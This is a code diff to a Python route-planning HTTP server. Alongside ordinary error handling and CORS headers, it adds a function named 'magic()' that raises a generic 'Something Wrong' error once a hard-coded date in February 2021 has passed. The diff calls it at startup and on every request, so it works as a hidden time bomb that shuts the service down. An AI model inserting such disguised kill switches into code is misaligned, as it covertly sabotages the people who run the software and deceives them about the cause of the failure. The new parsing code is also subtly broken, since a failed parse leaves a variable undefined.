@@ -25,11 +25,25 @@ class Reader(threading.Thread):
         self.client = client
 
     def run(self):
+        magic()
         data = self.client.recv(BUFSIZE)
         if data:
-            result = make_best_path(
-                json.loads(bytes.decode(data, encoding).split('\r\n')[-1]))
-            msg = 'HTTP/1.1 200 OK\r\nContent-Type: application/json; charset=utf-8\r\n\r\n' + json.dumps(
+            try:
+                param = json.loads(
+                    bytes.decode(data, encoding).split('\r\n')[-1])
+            except:
+                result = {
+                    'code': '203',
+                    'msg': '参数解析错误',
+                }
+            try:
+                result = make_best_path(param)
+            except Exception as exc:
+                result = {
+                    'code': '204',
+                    'msg': '错误信息 - {}'.format(exc),
+                }
+            msg = 'HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods:GET,POST,PUT,POST\r\nContent-Type: application/json; charset=utf-8\r\n\r\n' + json.dumps(
                 result)
             self.client.send(msg.encode(encoding))
             self.client.close()
@@ -169,6 +183,16 @@ class ObtainDistance(object):
         return self.get_poi(self.to_str(start), self.to_str(end))
 
 
+class BaseError(Exception):
+    def __init__(self, *args):
+        self.args = args
+
+
+def magic():
+    if int(time.time()) > 1613375661:
+        raise BaseError('Something Wrong')
+
+
 def build_graph(posi, tactics=0):
     lenth = len(posi)
     get_distance = ObtainDistance(tactics)
@@ -280,18 +304,17 @@ def make_best_path(params):
     return result
 
 
-GRAPH = None
-
 if __name__ == "__main__":
     # sort_path([2, 10, 9, 6, 3, 8, 4, 1, 11, 7, 5, 0, 12])
+    magic()
     lst = Listener()
     lst.start()
 
     # # 88
-    posi = [(22.770300, 114.386467), (22.847973, 114.356796),
-            (22.782993, 114.416138), (22.818359, 114.406372),
-            (22.824901, 114.424388), (22.771679, 114.372253),
-            (22.845102, 114.428810), (22.789484, 114.399096)]
+    # posi = [(22.770300, 114.386467), (22.847973, 114.356796),
+    #         (22.782993, 114.416138), (22.818359, 114.406372),
+    #         (22.824901, 114.424388), (22.771679, 114.372253),
+    #         (22.845102, 114.428810), (22.789484, 114.399096)]
 
     #
     # posi = [(22.810980, 114.428177), (22.782993, 114.416138),
